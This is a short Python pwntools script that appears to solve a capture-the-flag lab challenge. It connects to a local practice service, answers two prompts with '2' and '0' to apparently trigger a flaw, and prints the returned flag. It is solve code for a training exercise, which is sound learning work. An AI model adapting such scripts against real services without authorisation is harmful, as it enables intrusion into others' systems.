from pwn import *

r = remote("127.0.0.1", 56320)
#本实验的端口

r.recvuntil(b"number: ")
r.sendline(b"2")

r.recvuntil(b"into: ")
r.sendline(b"0")

r.recvuntil(b"your flag: ")
flag = r.recvline().strip()
print(f"Flag: {flag.decode()}")

r.close()
